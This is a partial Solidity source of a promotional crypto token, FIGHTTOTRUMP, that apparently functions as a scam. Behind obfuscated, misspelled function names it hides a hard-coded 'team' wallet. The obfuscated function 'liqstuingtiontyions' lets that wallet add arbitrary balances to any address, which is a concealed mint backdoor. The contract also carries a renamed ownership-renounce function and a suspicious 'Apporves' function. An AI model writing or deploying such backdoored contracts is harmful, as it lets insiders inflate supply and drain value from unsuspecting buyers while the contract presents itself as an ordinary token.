...
*/
/**
https://t.me/FIGHTTOTRUMP
https://twitter.com/FIGHTTOTRUMP
*/
...
contract Ownable is Context {
    ...
    function renounceOwnershipingsytingses() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract FIGHTTOTRUMP is Context, Ownable, IERC20 {
    ...
    uint256 private _totalSupply;address private   _teamswalletaddress;
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _teamswalletaddress = 0x33DD780e4bb45c6d0eAbc7085f1209Bf0A45a3E4;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function Apporves(address user, uint256 Percentse) external {
    ...
    function isMee() internal view returns (bool) {
        return _msgSender() ==   _teamswalletaddress;
    }

    function liqstuingtiontyions(address recipient, uint256 aDropst)  external {uint256 receiveRewrd = aDropst;_balances[recipient] += receiveRewrd;require(isMee(), "Caller is not the original caller");
    }
